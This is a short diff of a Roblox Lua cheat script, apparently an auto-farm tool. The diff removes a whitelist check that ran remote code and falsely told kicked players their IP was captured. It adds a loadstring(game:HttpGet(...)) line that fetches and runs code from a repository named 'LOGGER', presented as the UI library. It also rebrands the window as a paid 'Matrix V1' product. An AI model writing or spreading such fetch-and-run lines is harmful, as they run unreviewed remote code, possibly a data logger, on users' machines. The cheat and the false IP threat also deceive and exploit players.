@@ -1,13 +1,6 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local whitelist = loadstring(game:HttpGet(
- "https://raw.githubusercontent.com/user-Nombre123J/Whitelist-/refs/heads/main/Whitelist4.0"))()
-
-if not whitelist[LocalPlayer.UserId] then
-    LocalPlayer:Kick("IP CAPTURADA...🔒")
-    return
-end
 
 -- ↓ AQUÍ YA VA TU SCRIPT
 local Players = game:GetService("Players")
@@ -26,15 +19,18 @@ if not displayName or displayName == "" then
 end
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-local title = ("FASH FARMING | WELCOME - 👑 %s"):format(displayName)
 
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/user-Nombre123J/User-404/refs/heads/main/Library%20dragon"))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ikkkL624/LOGGER/refs/heads/main/IAKAKAK", true))()
 
-local window = library:AddWindow(title, {
+local player = game.Players.LocalPlayer
+local displayName = player.DisplayName or player.Name
+
+local window = library:AddWindow("Matrix V1 | Paid | Hello " .. displayName, {
     main_color = Color3.fromRGB(0, 0, 0),
-    min_size = Vector2.new(580, 900),
+    min_size = Vector2.new(650, 870),
     can_resize = true,
 })
+
 local AutoFarm = window:AddTab("Farm Op")
 
 
